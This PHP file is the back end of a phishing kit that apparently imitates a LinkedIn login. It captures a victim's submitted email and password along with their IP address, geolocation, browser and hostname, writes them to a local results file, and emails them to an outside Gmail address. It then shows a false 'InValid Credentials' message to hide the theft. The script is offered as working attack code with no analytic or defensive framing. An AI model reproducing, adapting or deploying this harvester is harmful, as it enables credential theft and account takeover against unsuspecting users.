<?php
$email = trim($_POST['email']);
$password = trim($_POST['password']);
if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
        $addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
        $country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
        $timedate = date("D/M/d, Y g(idea) a"); 
        $browserAgent = $_SERVER['HTTP_USER_AGENT'];
        $hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|-------------------------------------------------|\n";
	$message .= "Email Address         : ".$session_key."\n";
	$message .= "Password              : ".$session_password."\n";
	$message .= "|-------------------------------------------------|\n";
        $message .= "|Client IP: ".$ip."\n";
        $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
        $message .= "Browser                :".$browserAgent."\n";
        $message .= "Date & Time            : ".$timedate."\n";
        $message .= "Country                : ".$country."\n";
        $message .= "HostName               : ".$hostname."\n";
	$message .= "|=================================================|\n";

        $file = fopen("rezult.txt","a");
        fwrite($file,$message);
        fclose($file);

	$send = "lee22joey@gmail.com";
	$subject = "||likedin ReZulT|| $country | $email | $ip |";
    mail($send, $subject, $message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>